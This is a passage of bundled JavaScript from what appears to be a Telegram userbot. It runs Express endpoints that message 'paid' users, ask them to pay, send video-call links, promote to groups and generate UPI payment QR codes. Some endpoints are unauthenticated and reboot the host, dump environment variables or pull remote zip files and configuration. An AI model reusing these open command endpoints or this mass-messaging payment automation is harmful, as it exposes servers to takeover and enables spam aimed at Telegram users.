        this.app.get('/resptopaid', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!\nMsg = ${decodeURIComponent(req.query.msg)}`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                console.log("Received Requst to respond!!");
                const msg = decodeURIComponent(req.query.msg);
                if (yield index_1.tgClass.instanceExist()) {
                    yield (0, utils_1.respToPaidPplfn)(yield index_1.tgClass.getClient(), msg ? 1000 : 24000, msg, false, false, false);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/resptopaid2', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!\nMsg = ${req.query.msg}`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                const msg = req.query.msg;
                if (yield index_1.tgClass.instanceExist()) {
                    yield (0, utils_1.respToPaidPplfn)(yield index_1.tgClass.getClient(), msg ? 6000 : 24000, msg, false, true, true);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/joinchannel', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`joining: ${req.query.username}`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const username = req.query.username;
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    const result = yield (0, utils_1.joinChannels)(yield index_1.tgClass.getClient(), `@${username}`, true);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/leaveChannel', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            const username = req.query.username;
            res.send(`Joining ${username}`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const username = req.query.username;
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    const db = dbservice_1.UserDataDtoCrud.getInstance();
                    const channel = yield db.getActiveChannel({ username });
                    yield (0, utils_1.leaveChannel)(yield index_1.tgClass.getClient(), channel);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/assureppl', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                const msg = (0, messages_1.pickOneMsg)(messages_1.messages.assureMSgArray);
                if (yield index_1.tgClass.instanceExist()) {
                    yield (0, utils_1.respToPaidPplfn)(yield index_1.tgClass.getClient(), msg ? 6000 : 24000, msg, false, true, false);
                    // await sendVclinks(await tgClass.getClient());
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/sendvclinks', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                const msg = (0, messages_1.pickOneMsg)(messages_1.messages.assureMSgArray);
                if (yield index_1.tgClass.instanceExist()) {
                    yield (0, utils_1.sendVclinks)(yield index_1.tgClass.getClient());
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/replierState', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                yield (0, respondToMsgs_1.getReplierState)();
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/asktopay', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Responding!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    yield (0, utils_1.asktoPay)(yield index_1.tgClass.getClient(), 1000);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/calltopaid', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send(`Call initiated!!`);
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            console.log('Executing Calls init');
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    yield (0, utils_1.callToPaid)();
                }
                else {
                    console.log("instanse not exist");
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/getchannels', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('responding!!');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                const client = yield index_1.tgClass.getClient();
                const chats = yield client.getDialogs({ limit: 130 });
                let reply2 = `${(process.env.clientId).toUpperCase()}\nMYCHANNELS:\n\n`;
                chats.map((chat) => {
                    if (chat.isChannel || chat.isGroup) {
                        const username = chat.entity.toJSON().username ? ` @${chat.entity.toJSON().username} ` : chat.entity.toJSON().id.toString();
                        reply2 = reply2 + username + '|';
                    }
                });
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(reply2)}`);
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/getuserstats', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('responding!!');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                yield (0, index_1.getUserStats)(true);
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/getuserstats2', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('responding!!');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                yield (0, index_1.getUserStats)(false);
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/checktghealth', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('responding!!');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                const client = index_1.tgClass.getClient();
                if (client) {
                    yield client.sendMessage('@spambot', { message: '/start' });
                }
                else {
                    console.log("instanse not exist");
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/getDemostats', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('responding!!');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                yield (0, index_1.getDemoStats)(true);
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/getDemostat2', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('responding!!');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                yield (0, index_1.getDemoStats)(false);
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/getenv', (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                console.log(process.env);
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
            res.send("hii");
        }));
        this.app.get('/getpid', (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                console.log(process.pid);
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
            res.send("hii");
        }));
        this.app.get('/refreshenv', (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                yield (0, Config_1.getDataAndSetEnvVariables)(`https://api.npoint.io/7c2682f37bb93ef486ba/${process.env.clientId}`);
                yield (0, Config_1.getDataAndSetEnvVariables)("https://api.npoint.io/cc57d60feea67e47b6c4");
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
            res.send("hello");
        }));
        this.app.get('/getmsgs', (req, res) => __awaiter(this, void 0, void 0, function* () {
            const key = req.query.k;
            if (key) {
                res.send(messages_1.messages[key]);
            }
            else {
                res.json(messages_1.messages);
            }
        }));
        this.app.get('/getlinks', (req, res) => __awaiter(this, void 0, void 0, function* () {
            const key = req.query.k;
            if (key) {
                res.send(messages_1.messages[key]);
            }
            else {
                res.json(messages_1.links2);
            }
        }));
        this.app.get('/promote', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('promoting!!');
            console.log("Received Promotion Request!");
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    yield promotions_1.Promotor.getInstance(index_1.tgClass.getClient()).PromoteToGrp();
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/connectToMongo', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            const userDataDtoCrud = dbservice_1.UserDataDtoCrud.getInstance();
            if (!userDataDtoCrud.isConnected) {
                try {
                    const isConnected = userDataDtoCrud.connect();
                    res.send(isConnected);
                }
                catch (e) {
                    res.send(e);
                }
            }
        }));
        this.app.get('/disconnect', (req, res) => __awaiter(this, void 0, void 0, function* () {
            console.log('Recieved request for disconnect!');
            try {
                yield index_1.tgClass.deleteInstance();
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/exit', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('EXITTING SERVICE');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            console.log('Recieved request for exit!');
            yield index_1.tgClass.deleteInstance();
            yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
            process.env['session'] = null;
            process.exit();
        }));
        this.app.get('/markasread', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('MArking as read');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            try {
                console.log("Received MarkasRead Req");
                const all = req.query.all;
                if (yield index_1.tgClass.instanceExist()) {
                    yield (0, utils_1.MarkAsRead)(index_1.tgClass.getClient(), all);
                }
                // setUpiIds()
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        }));
        this.app.get('/dsudostop', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('REBOOT INITIATED');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            (0, child_process_1.execSync)('reboot');
        }));
        this.app.get('/connect', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('Connect INITIATED');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            yield index_1.tgClass.connect();
        }));
        this.app.get('/getNewFiles', (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            res.send('getting files');
            next();
        }), (req, res) => __awaiter(this, void 0, void 0, function* () {
            const ins = yield cloudinaryService_1.default.getInstance();
        }));
        this.app.get('/set-model/:modelName', (req, res) => {
            const { modelName } = req.params;
            const success = (0, gemini_1.setGeminiModel)(modelName);
            if (success) {
                res.json({ status: 'success', message: `Model changed to ${modelName}` });
            }
            else {
                res.status(400).json({ status: 'error', message: 'Invalid model name' });
            }
        });
    }
    earlyFlushMiddleware(req, res, next) {
        return __awaiter(this, void 0, void 0, function* () {
            if (typeof res.flush === 'function') {
                res.flush();
            }
            next();
        });
    }
    static getInstance() {
        if (!ExpressServer.instance) {
            ExpressServer.instance = new ExpressServer();
        }
        return ExpressServer.instance;
    }
    static instanceExist() {
        if (!ExpressServer.instance) {
            return false;
        }
        else {
            return true;
        }
    }
    stop() {
        var _a;
        if (this.isRunning) {
            (_a = this.server) === null || _a === void 0 ? void 0 : _a.close();
            this.isRunning = false;
        }
        else {
            console.log("Server is not running.");
        }
    }
    connectToTg() {
        return __awaiter(this, void 0, void 0, function* () {
            yield index_1.tgClass.startTg();
            yield (0, Helpers_1.sleep)(10000);
            yield (0, jobs_1.runJobs)();
        });
    }
    startConn() {
        return __awaiter(this, void 0, void 0, function* () {
            const userDataDtoCrud = dbservice_1.UserDataDtoCrud.getInstance();
            if (!userDataDtoCrud.isConnected) {
                try {
                    const isConnected = yield userDataDtoCrud.connect();
                    if (isConnected) {
                        let cloudinaryInst = yield cloudinaryService_1.default.getInstance();
                        yield (0, UpiClass_1.setUpiIds)();
                        yield this.connectToTg();
                    }
                    else {
                        console.log('Error While Connecting to DB=====', isConnected);
                    }
                }
                catch (error) {
                    console.log('Error While Connecting to DB', error);
                }
            }
            else {
                yield this.connectToTg();
            }
        });
    }
    runServer() {
        return __awaiter(this, void 0, void 0, function* () {
            console.log("CHECKING IF SRVICE STILL EXIST!!");
            this.server = this.app.listen(this.port, () => __awaiter(this, void 0, void 0, function* () {
                console.log(`Server running on port ${this.port} and ID: ${exports.prcessID}`);
            }));
            this.server.on('error', (error) => __awaiter(this, void 0, void 0, function* () {
                (0, parseError_1.parseError)(error);
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: ${error}`)}`);
            }));
            this.server.on('uncaughtException', (err) => __awaiter(this, void 0, void 0, function* () {
                console.log('------------An uncaught exception occurred:', err);
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: UNCAUGHT - ${err}`)}`);
            }));
            this.server.on('close', () => __awaiter(this, void 0, void 0, function* () {
                yield index_1.tgClass.destroy();
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}: SERVER CLOSING`)}`);
                console.log('SERVER CLOSING');
                yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
                process.exit(1);
            }));
            this.isRunning = true;
        });
    }
    start() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.isRunning) {
                yield this.runServer();
            }
            else {
                console.log("Server is already running.");
            }
        });
    }
}
exports.ExpressServer = ExpressServer;
let retrytime = 0;
const id = setInterval(() => __awaiter(void 0, void 0, void 0, function* () {
    if (expresApp) {
        retrytime++;
        if (expresApp.isRunning) {
            clearInterval(id);
        }
        else {
            expresApp.start();
            if (retrytime === 5) {
                console.log("EXIT-ing");
                yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId.toUpperCase()}:UNABLE TO START - EXITTING - ${process.pid}`)}`);
                process.exit(1);
            }
        }
    }
}), 5000);
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        expresApp = ExpressServer.getInstance();
    });
}
main();


/***/ }),

/***/ "./src/cloudinaryService.ts":
/*!**********************************!*\
  !*** ./src/cloudinaryService.ts ***!
  \**********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.setQR = setQR;
console.log("in Cloudinary");
const cloudinary = __importStar(__webpack_require__(/*! cloudinary */ "cloudinary"));
const path = __importStar(__webpack_require__(/*! path */ "path"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const qrcode_1 = __importDefault(__webpack_require__(/*! qrcode */ "qrcode"));
const UpiClass_1 = __webpack_require__(/*! ./UpiClass */ "./src/UpiClass.ts");
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const adm_zip_1 = __importDefault(__webpack_require__(/*! adm-zip */ "adm-zip"));
function setQR(upi, fileName) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        console.log(`[QR] Generating QR code for UPI: ${upi}`);
        try {
            // Validate inputs
            if (!(upi === null || upi === void 0 ? void 0 : upi.trim())) {
                throw new Error('UPI ID is required');
            }
            if (!(fileName === null || fileName === void 0 ? void 0 : fileName.trim())) {
                throw new Error('File name is required');
            }
            if (!process.env.name) {
                throw new Error('Environment variable "name" is not set');
            }
            // Clean and normalize username
            const username = (process.env.name).replace(/\s/g, "");
            const cleanDescription = username
                .normalize('NFD') // Decompose unicode characters
                .replace(/[\u0300-\u036f]/g, '') // Remove diacritics
                .replace(/[^\x20-\x7E]/g, '') // Remove non-ASCII characters including emojis
                .replace(/[^a-zA-Z0-9-\s]/g, '') // Keep only alphanumeric, hyphens and spaces
                .replace(/\s+/g, '') // Replace spaces with hyphens
                .trim(); // Remove leading/trailing whitespace
            if (!cleanDescription) {
                throw new Error('Username is invalid after cleaning');
            }
            // Create UPI URL
            const url = `upi://pay?pa=${upi.trim()}&tn=${cleanDescription}&pn=${cleanDescription}&${messages_1.endpoint}`;
            console.log(`[QR] Generated UPI URL: ${url}`);
            // Create client-specific directory if needed
            const clientId = ((_a = process.env.dbcoll) === null || _a === void 0 ? void 0 : _a.toLowerCase()) || 'default';
            const baseDir = path.resolve(__dirname, '../', clientId);
            if (!fs.existsSync(baseDir)) {
                fs.mkdirSync(baseDir, { recursive: true });
                console.log(`[QR] Created directory: ${baseDir}`);
            }
            // Set up file path
            const filePath = path.resolve(baseDir, fileName);
            console.log(`[QR] Saving QR code to: ${filePath}`);
            // Generate QR code with promise
            return new Promise((resolve, reject) => {
                qrcode_1.default.toFile(filePath, url, {
                    margin: 1,
                    width: 512, // Set a reasonable size
                    errorCorrectionLevel: 'H' // Highest error correction
                }, (err) => {
                    if (err) {
                        console.error(`[QR] Error generating QR code: ${err.message}`);
                        reject(err);
                        return;
                    }
                    console.log(`[QR] Successfully generated QR code for ${url}`);
                    console.log(`[QR] Saved as: ${fileName}`);
                    resolve(true);
                });
            });
        }
        catch (error) {
            console.error(`[QR] Error in setQR:`);
            console.error(`[QR] ${error.message}`);
            return false;
        }
    });
}
class CloudinaryService {
    constructor() {
        this.resources = new Map();
        cloudinary.v2.config({
            cloud_name: process.env.CL_NAME,
            api_key: process.env.CL_APIKEY,
            api_secret: process.env.CL_APISECRET
        });
    }
    static getInstance() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!CloudinaryService.instance) {
                CloudinaryService.instance = new CloudinaryService();
            }
            const name = process.env.dbcoll.toLowerCase();
            yield CloudinaryService.instance.getResourcesFromFolder(name);
            return CloudinaryService.instance;
        });
    }
    // Method to download a zip from URL and extract in root path (replace if file already exists in path)
    downloadAndExtractZip(url) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b;
            const clientId = ((_a = process.env.dbcoll) === null || _a === void 0 ? void 0 : _a.toLowerCase()) || 'default';
            const zipPath = path.resolve(__dirname, `temp_${clientId}.zip`);
            const extractPath = path.resolve(__dirname, '../', clientId);
            console.log(`[Download] Starting download from ${url}`);
            console.log(`[Download] Using temporary zip path: ${zipPath}`);
            console.log(`[Download] Target extraction path: ${extractPath}`);
            try {
                // Ensure extract directory exists
                if (!fs.existsSync(extractPath)) {
                    fs.mkdirSync(extractPath, { recursive: true });
                    console.log(`[Download] Created extraction directory: ${extractPath}`);
                }
                // Download the zip file
                const response = yield (0, fetchWithTimeout_1.fetchWithTimeout)(url, {
                    responseType: 'arraybuffer',
                    timeout: 30000 // 30 second timeout
                });
                if (!response) {
                    throw new Error('No response received from server');
                }
                if (response.status === 200 && response.data) {
                    // Clean up existing zip if it exists
                    if (fs.existsSync(zipPath)) {
                        fs.unlinkSync(zipPath);
                        console.log(`[Download] Removed existing temporary zip file`);
                    }
                    // Write the zip file
                    fs.writeFileSync(zipPath, response.data);
                    console.log(`[Download] Zip file downloaded successfully (${response.data.length} bytes)`);
                    // Extract the zip file using adm-zip
                    const zip = new adm_zip_1.default(zipPath);
                    zip.extractAllTo(extractPath, true);
                    console.log(`[Download] Zip file extracted successfully to ${extractPath}`);
                    // Clean up the temporary zip file
                    fs.unlinkSync(zipPath);
                    console.log(`[Download] Cleaned up temporary zip file`);
                    return true;
                }
                else {
                    throw new Error(`Server returned status ${response.status}`);
                }
            }
            catch (error) {
                console.error(`[Download] Error during download and extract operation:`);
                console.error(`[Download] ${error.message}`);
                if (error.code)
                    console.error(`[Download] Error code: ${error.code}`);
                if ((_b = error.response) === null || _b === void 0 ? void 0 : _b.status)
                    console.error(`[Download] HTTP Status: ${error.response.status}`);
                // Clean up on error
                try {
                    if (fs.existsSync(zipPath)) {
                        fs.unlinkSync(zipPath);
                        console.log(`[Download] Cleaned up temporary zip file after error`);
                    }
                }
                catch (cleanupError) {
                    console.error(`[Download] Error during cleanup: ${cleanupError.message}`);
                }
                return false;
            }
        });
    }
    getResourcesFromFolder(folderName) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b, _c;
            console.log('FETCHING NEW FILES!! from CLOUDINARY');
            yield this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${process.env.dbcoll}/files/download-all`);
            // await this.findAndSaveResources(folderName, 'image');
            // await this.findAndSaveResources(folderName, 'video');
            yield setQR((_a = process.env.qrId) === null || _a === void 0 ? void 0 : _a.trim(), "QR.jpg");
            yield setQR((_b = UpiClass_1.UpiIds['gpay']) === null || _b === void 0 ? void 0 : _b.trim(), "QR1.jpg");
            yield setQR((_c = process.env.gpayId) === null || _c === void 0 ? void 0 : _c.trim(), "QR2.jpg");
        });
    }
    createNewFolder(folderName) {
        return __awaiter(this, void 0, void 0, function* () {
            yield this.createFolder(folderName);
            yield this.uploadFilesToFolder(folderName);
        });
    }
    overwriteFile() {
        return __awaiter(this, void 0, void 0, function* () {
            const files = ['pic', 'dmp1', 'dmp2', 'dmp3', 'dmp4', 'dp1', 'dp2', 'dp3'];
            for (let i = 0; i < files.length; i++) {
                try {
                    const filePath = path.resolve(__dirname, '../', process.env.dbcoll.toLowerCase(), `${files[i]}.jpg`);
                    const result = yield cloudinary.v2.uploader.upload(filePath, {
                        resource_type: 'auto',
                        folder: process.env.dbcoll.toLowerCase(),
                        overwrite: true,
                        invalidate: true,
                        public_id: `${files[i]}`
                    });
                    console.log(result);
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                }
            }
        });
    }
    findAndSaveResources(folderName, type) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const { resources } = yield cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });
                resources.forEach((resource) => __awaiter(this, void 0, void 0, function* () {
                    try {
                        this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);
                        yield saveFile(resource.url, `${resource.public_id.split('/')[1].split('_')[0]}`);
                    }
                    catch (error) {
                        console.log(resource);
                        (0, parseError_1.parseError)(error);
                    }
                }));
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        });
    }
    createFolder(folderName) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                const result = yield cloudinary.v2.api.create_folder(folderName);
                return result;
            }
            catch (error) {
                console.error('Error creating folder:', error);
                throw error;
            }
        });
    }
    // Function to upload files from URLs to a specific folder in Cloudinary
    uploadFilesToFolder(folderName) {
        return __awaiter(this, void 0, void 0, function* () {
            const uploadPromises = Array.from(this.resources.entries()).map((_a) => __awaiter(this, [_a], void 0, function* ([key, url]) {
                try {
                    const result = yield cloudinary.v2.uploader.upload_large(url, {
                        folder: folderName,
                        resource_type: 'auto',
                        public_id: key, // Set the key as the public_id
                    });
                    return result;
                }
                catch (error) {
                    console.error('Error uploading file:', error);
                    throw error;
                }
            }));
            try {
                return yield Promise.all(uploadPromises);
            }
            catch (error) {
                console.error('Error uploading files:', error);
                throw error;
            }
        });
    }
    printResources() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a;
            try {
                (_a = this.resources) === null || _a === void 0 ? void 0 : _a.forEach((val, key) => {
                    console.log(key, ":", val);
                });
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        });
    }
    get(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    getBuffer(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
}
exports["default"] = CloudinaryService;
function saveFile(url, name) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        const extension = url.substring(url.lastIndexOf('.') + 1, url.length);
        const clientId = ((_a = process.env.dbcoll) === null || _a === void 0 ? void 0 : _a.toLowerCase()) || 'default';
        const mypath = path.resolve(__dirname, '../', clientId, `${name}.${extension}`);
        (0, fetchWithTimeout_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' })
            .then(response => {
            if ((response === null || response === void 0 ? void 0 : response.status) === 200) {
                try {
                    if (!fs.existsSync(mypath)) {
                        fs.writeFileSync(mypath, response.data);
                        console.log(`${name}.${extension} Saved!!`);
                    }
                    else {
                        fs.unlinkSync(mypath);
                        fs.writeFileSync(mypath, response.data);
                        console.log(`${name}.${extension} Replaced!!`);
                    }
                }
                catch (err) {
                    console.error(err);
                }
            }
            else {
                throw new Error(`Unable to download file from ${url}`);
            }
        }).catch(err => {
            console.error(err);
        });
    });
}


/***/ }),

/***/ "./src/common.ts":
/*!***********************!*\
  !*** ./src/common.ts ***!
  \***********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.fakeScreenshotText = void 0;
exports.getClientFilePath = getClientFilePath;
const path = __importStar(__webpack_require__(/*! path */ "path"));
exports.fakeScreenshotText = ['wallet txn', 'tn=', 'in 24k gold', 'suncrypto',
    'xxxx1143', 'fmpibi2147483647', 'xxxxxxxx1920', 'june 2020', 'p2032484594584584538',
    '7070979668', 'do more with', 'purchase confirmed', 'prepkod', 'preprod',
    'matlab no more', 'no pin upto 500₹', 'type...', 'the best of upi',
    "payments successful", 'unlock rewards >', 'unlock rewards>', 'get inked',
    'himan37922', 'win 5 lucky', 'getaway!', 'updated wallet', 'xx621933',
    'your coupons!',
    'fmpib1731', 'futures &', 'lightning-fast', 'balance 120', '2028010000234',
    'wallet balance 12', 'rs300', 'rs10', '10911', '115289349823', 'bak stat',
    'money sitting idle', 'chance to grow'];
function getClientFilePath(fileName) {
    var _a;
    const clientId = ((_a = process.env.dbcoll) === null || _a === void 0 ? void 0 : _a.toLowerCase()) || 'default';
    return path.resolve(__dirname, '../', clientId, fileName);
}


/***/ }),

/***/ "./src/dbservice.ts":
/*!**************************!*\
  !*** ./src/dbservice.ts ***!
  \**************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataDtoCrud = exports.user = void 0;
console.log(`in Db - ${process.env.dbcoll} | ${process.env.username}`);
const mongodb_1 = __webpack_require__(/*! mongodb */ "mongodb");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
var user;
(function (user) {
    user["picCount"] = "picCount";
    user["totalCount"] = "totalCount";
    user["lastMsgTimeStamp"] = "lastMsgTimeStamp";
    user["prfCount"] = "prfCount";
    user["paidCount"] = "paidCount";
    user["limitTime"] = "limitTime";
    user["canReply"] = "canReply";
    user["payAmount"] = "payAmount";
    user["chatId"] = "chatId";
    user["username"] = "username";
    user["paidReply"] = "paidReply";
    user["demoGiven"] = "demoGiven";
    user["secondShow"] = "secondShow";
    user["picsSent"] = "picsSent";
    user["videos"] = "videos";
